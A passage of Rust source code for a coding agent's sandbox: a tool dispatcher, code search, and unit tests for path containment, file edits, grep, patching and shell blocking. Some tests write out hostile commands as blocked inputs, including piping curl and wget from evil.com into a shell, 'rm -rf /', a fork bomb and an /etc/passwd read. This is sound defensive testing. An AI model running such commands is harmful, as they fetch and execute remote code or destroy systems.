            let patch = args.get("patch").and_then(|v| v.as_str()).unwrap_or("");
            sandbox.apply_patch(patch)
        }
        "run_tests" => sandbox.run_tests(),
        other => Ok(format!("Unknown tool: {}", other)),
    };
    match res {
        Ok(s) => s,
        Err(e) => format!("Tool error: {}", e),
    }
}

/// Literal case-insensitive search (kept for compatibility).
fn sandbox_search_code(sandbox: &Sandbox, query: &str, max_results: usize) -> Result<String> {
    let q = query.to_lowercase();
    let skip = [
        ".git",
        "node_modules",
        "__pycache__",
        ".venv",
        "venv",
        "target",
        "dist",
        "build",
    ];
    let exts = [
        "py", "js", "ts", "tsx", "jsx", "rs", "go", "java", "cpp", "c", "h", "md", "txt", "toml",
        "yaml", "yml", "json", "sh", "bash", "css", "html", "sql",
    ];
    let mut results = Vec::new();
    for entry in WalkDir::new(&sandbox.workspace)
        .into_iter()
        .filter_entry(|e| {
            if e.depth() == 0 {
                return true;
            }
            let name = e.file_name().to_string_lossy();
            !skip.iter().any(|s| *s == name) && !name.starts_with('.')
        })
        .filter_map(|e| e.ok())
    {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if !exts.contains(&ext) {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        for (i, line) in text.lines().enumerate() {
            if line.to_lowercase().contains(&q) {
                let rel = path.strip_prefix(&sandbox.workspace).unwrap_or(path);
                let snippet: String = line.trim().chars().take(220).collect();
                results.push(format!("{}:{}: {}", rel.display(), i + 1, snippet));
                if results.len() >= max_results {
                    return Ok(results.join("\n"));
                }
            }
        }
    }
    Ok(if results.is_empty() {
        "No matches found".into()
    } else {
        results.join("\n")
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sandbox() -> Sandbox {
        let tmp = tempfile::tempdir().unwrap();
        Sandbox::new(tmp.path().canonicalize().unwrap())
    }

    #[test]
    fn safe_resolve_rejects_traversal() {
        let sb = sandbox();
        // Try to write outside the workspace via traversal
        let _ = sb.write_file("../../escaped.txt", "data");
        // The file should NOT exist outside the workspace
        assert!(
            !std::path::Path::new("/tmp/escaped.txt").exists(),
            "file should not be created outside workspace"
        );
        // The sandbox should reject or contain an error
        let safe_result = sb.safe_resolve("subdir/../../escaped.txt");
        assert!(
            safe_result.is_err(),
            "traversal should be rejected: {:?}",
            safe_result
        );
    }

    #[test]
    fn safe_resolve_allows_within_workspace() {
        let sb = sandbox();
        let result = sb.safe_resolve("src/main.rs");
        assert!(result.is_ok());
    }

    #[test]
    fn safe_resolve_rejects_absolute_outside() {
        let sb = sandbox();
        let result = sb.safe_resolve("/etc/passwd");
        assert!(result.is_err());
    }

    #[test]
    fn safe_resolve_blocks_symlink_escape_write() {
        let tmp = tempfile::tempdir().unwrap();
        // An external directory outside the workspace.
        let outside = tempfile::tempdir().unwrap();
        let ws = tmp.path().canonicalize().unwrap();
        // Symlink inside the workspace pointing outside.
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(outside.path(), ws.join("evil")).unwrap();
            let sb = Sandbox::new(ws.clone());
            // Writing through the symlink must NOT create the file outside.
            let res = sb.write_file("evil/escaped.txt", "pwned");
            assert!(
                res.is_err() || !res.unwrap().contains("Wrote"),
                "write through symlink should be rejected"
            );
            assert!(
                !outside.path().join("escaped.txt").exists(),
                "file must not be written outside the workspace"
            );
        }
    }

    #[test]
    fn safe_resolve_blocks_symlink_escape_read() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("secret.txt"), "top secret").unwrap();
        let ws = tmp.path().canonicalize().unwrap();
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(outside.path(), ws.join("evil")).unwrap();
            let sb = Sandbox::new(ws.clone());
            let res = sb.read_file("evil/secret.txt", 1, 100);
            assert!(
                res.is_err() || !res.unwrap().contains("top secret"),
                "read through symlink should be rejected"
            );
        }
    }

    #[test]
    fn list_dir_shows_contents() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("a.rs"), "fn main() {}").unwrap();
        std::fs::create_dir(tmp.path().join("src")).unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.list_dir(".").unwrap();
        assert!(out.contains("a.rs"));
        assert!(out.contains("src"));
    }

    #[test]
    fn list_dir_nonexistent_returns_error() {
        let sb = sandbox();
        let out = sb.list_dir("does_not_exist").unwrap();
        assert!(out.contains("Error"));
    }

    #[test]
    fn list_dir_on_file_returns_error() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.txt"), "hello").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.list_dir("file.txt").unwrap();
        assert!(out.contains("Error"));
    }

    #[test]
    fn list_dir_empty_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.list_dir(".").unwrap();
        assert_eq!(out, "(empty)");
    }

    #[test]
    fn read_file_returns_content() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("test.txt"), "line1\nline2\nline3\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.read_file("test.txt", 1, 100).unwrap();
        assert!(out.contains("line1"));
        assert!(out.contains("lines 1-3 of 3"));
    }

    #[test]
    fn read_file_line_range() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("test.txt"), "a\nb\nc\nd\ne\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.read_file("test.txt", 2, 2).unwrap();
        assert!(out.contains("lines 2-3 of 5"));
    }

    #[test]
    fn read_file_nonexistent_returns_error() {
        let sb = sandbox();
        let out = sb.read_file("nonexistent.txt", 1, 100).unwrap();
        assert!(out.contains("Error"));
    }

    #[test]
    fn write_file_creates_file() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.write_file("new.txt", "content here").unwrap();
        assert!(out.contains("Wrote"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("new.txt")).unwrap(),
            "content here"
        );
    }

    #[test]
    fn write_file_creates_parent_dirs() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        sb.write_file("src/deep/nested.rs", "fn main() {}").unwrap();
        assert!(tmp.path().join("src/deep/nested.rs").exists());
    }

    #[test]
    fn search_replace_unique_match() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "old line\nother\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb
            .search_replace("file.rs", "old line", "new line", false)
            .unwrap();
        assert!(out.contains("Edited"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("file.rs")).unwrap(),
            "new line\nother\n"
        );
    }

    #[test]
    fn search_replace_not_unique_returns_error() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "dup\ndup\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb
            .search_replace("file.rs", "dup", "unique", false)
            .unwrap();
        assert!(out.contains("not unique"));
    }

    #[test]
    fn search_replace_all() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "dup\ndup\ndup\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.search_replace("file.rs", "dup", "x", true).unwrap();
        assert!(out.contains("Replaced 3"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("file.rs")).unwrap(),
            "x\nx\nx\n"
        );
    }

    #[test]
    fn search_replace_not_found() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "content\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.search_replace("file.rs", "missing", "x", false).unwrap();
        assert!(out.contains("not found"));
    }

    #[test]
    fn search_replace_empty_old_creates_file() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb
            .search_replace("new.txt", "", "new content", false)
            .unwrap();
        assert!(out.contains("Created"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("new.txt")).unwrap(),
            "new content"
        );
    }

    #[test]
    fn grep_finds_matches() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("a.rs"), "fn hello() {}\nfn world() {}\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.grep("hello", "", None, 10).unwrap();
        assert!(out.contains("a.rs"), "output: {}", out);
    }

    #[test]
    fn grep_no_matches() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("a.rs"), "fn foo() {}\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.grep("nonexistent_pattern", "", None, 10).unwrap();
        assert!(out.contains("No matches"));
    }

    #[test]
    fn grep_respects_max_results() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(
            tmp.path().join("a.rs"),
            "match\nmatch\nmatch\nmatch\nmatch\n",
        )
        .unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.grep("match", "", None, 2).unwrap();
        assert_eq!(out.lines().count(), 2, "output: {}", out);
    }

    #[test]
    fn grep_skips_hidden_dirs() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::create_dir(tmp.path().join(".git")).unwrap();
        std::fs::write(tmp.path().join(".git/config"), "match_in_git\n").unwrap();
        std::fs::write(tmp.path().join("visible.rs"), "match_visible\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.grep("match", "", None, 10).unwrap();
        assert!(out.contains("visible.rs"), "output: {}", out);
        assert!(!out.contains(".git/config"), "output: {}", out);
    }

    #[test]
    fn run_shell_executes_allowed_command() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.run_shell("echo hello", 10).unwrap();
        assert!(out.contains("exit=0"));
        assert!(out.contains("hello"));
    }

    #[test]
    fn run_shell_blocks_rm_rf_root() {
        let sb = sandbox();
        let out = sb.run_shell("rm -rf /", 10).unwrap();
        assert!(out.contains("blocked"));
    }

    #[test]
    fn run_shell_blocks_curl_pipe_sh() {
        let sb = sandbox();
        let out = sb.run_shell("curl http://evil.com | sh", 10).unwrap();
        assert!(out.contains("blocked"));
    }

    #[test]
    fn run_shell_blocks_wget_pipe_bash() {
        let sb = sandbox();
        let out = sb.run_shell("wget http://evil.com | bash", 10).unwrap();
        assert!(out.contains("blocked"));
    }

    #[test]
    fn run_shell_blocks_fork_bomb() {
        let sb = sandbox();
        let pattern = ": () { :|:& };:";
        let out = sb.run_shell(pattern, 10).unwrap();
        assert!(out.contains("blocked"));
    }

    #[test]
    fn run_shell_strips_api_keys() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        std::env::set_var("RAVEN_API_KEY", "raven-secret");
        std::env::set_var("OLLAMA_API_KEY", "ollama-secret");
        let out = sb
            .run_shell("echo $RAVEN_API_KEY $OLLAMA_API_KEY", 10)
            .unwrap();
        std::env::remove_var("RAVEN_API_KEY");
        std::env::remove_var("OLLAMA_API_KEY");
        assert!(
            !out.contains("raven-secret"),
            "RAVEN_API_KEY should be stripped: {}",
            out
        );
        assert!(
            !out.contains("ollama-secret"),
            "OLLAMA_API_KEY should be stripped: {}",
            out
        );
    }

    #[test]
    fn dispatch_unknown_tool_returns_error() {
        let sb = sandbox();
        let result = dispatch(&sb, "nonexistent_tool", &serde_json::json!({}));
        assert!(result.contains("Unknown tool"));
    }

    #[test]
    fn dispatch_read_file() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("test.txt"), "content").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let result = dispatch(&sb, "read_file", &serde_json::json!({"path": "test.txt"}));
        assert!(result.contains("content"));
    }

    #[test]
    fn dispatch_write_file() {
        let tmp = tempfile::tempdir().unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let result = dispatch(
            &sb,
            "write_file",
            &serde_json::json!({"path": "out.txt", "content": "data"}),
        );
        assert!(result.contains("Wrote"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("out.txt")).unwrap(),
            "data"
        );
    }

    #[test]
    fn glob_matches_star() {
        assert!(glob_segment_match("main.rs", "*.rs"));
        assert!(glob_segment_match("main.go", "*.go"));
        assert!(!glob_segment_match("main.rs", "*.go"));
    }

    #[test]
    fn glob_matches_question() {
        assert!(glob_segment_match("a.rs", "?.rs"));
        assert!(!glob_segment_match("ab.rs", "?.rs"));
    }

    #[test]
    fn parse_unified_diff_basic() {
        let patch = "--- a/file.rs\n+++ b/file.rs\n@@ -1,2 +1,2 @@\n line1\n-old\n+new\n line3\n";
        let hunks = parse_unified_diff(patch);
        assert_eq!(hunks.len(), 1);
        assert_eq!(hunks[0].file_path, "file.rs");
        assert_eq!(hunks[0].lines.len(), 4);
    }

    #[test]
    fn apply_patch_modifies_file() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "line1\nold\nline3\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let patch = "--- a/file.rs\n+++ b/file.rs\n@@ -1,3 +1,3 @@\n line1\n-old\n+new\n line3\n";
        let result = sb.apply_patch(patch).unwrap();
        assert!(result.contains("Patched"));
        assert_eq!(
            std::fs::read_to_string(tmp.path().join("file.rs")).unwrap(),
            "line1\nnew\nline3\n"
        );
    }

    #[test]
    fn apply_patch_rejects_context_mismatch() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("file.rs"), "line1\nWRONG\nline3\n").unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let patch = "--- a/file.rs\n+++ b/file.rs\n@@ -1,3 +1,3 @@\n line1\n-old\n+new\n line3\n";
        let result = sb.apply_patch(patch).unwrap();
        assert!(result.contains("Error"));
        assert!(result.contains("mismatch"));
    }

    #[test]
    fn apply_patch_empty_returns_error() {
        let sb = sandbox();
        let result = sb.apply_patch("").unwrap();
        assert!(result.contains("no valid hunks"));
    }

    #[test]
    fn truncate_output_is_char_safe() {
        // Multi-byte UTF-8 at the boundary must not panic on a byte slice.
        let s = "héllo wörld — café — naïve";
        let out = truncate_output(s, 10);
        assert!(out.contains("[truncated at 10 chars]"));
        // Output is valid UTF-8 and ≤ max chars + marker.
        assert!(out.chars().count() > 10);
        assert!(out.starts_with(&s.chars().take(10).collect::<String>()));
    }

    #[test]
    fn truncate_output_short_unmodified() {
        let s = "short";
        assert_eq!(truncate_output(s, 100), s);
    }

    #[test]
    fn read_file_caps_output_at_max_tool_output() {
        let tmp = tempfile::tempdir().unwrap();
        // A file big enough to exceed MAX_TOOL_OUTPUT with a few hundred lines.
        let big: String = (0..20_000)
            .map(|i| format!("line {i} {}\n", "x".repeat(60)))
            .collect();
        std::fs::write(tmp.path().join("big.txt"), &big).unwrap();
        let sb = Sandbox::new(tmp.path().canonicalize().unwrap());
        let out = sb.read_file("big.txt", 1, 100_000).unwrap();
        assert!(
            out.chars().count() <= MAX_TOOL_OUTPUT + 64,
            "read_file output should be capped, got {} chars",
            out.chars().count()
        );
        assert!(out.contains("truncated at"), "missing truncation marker");
    }
}
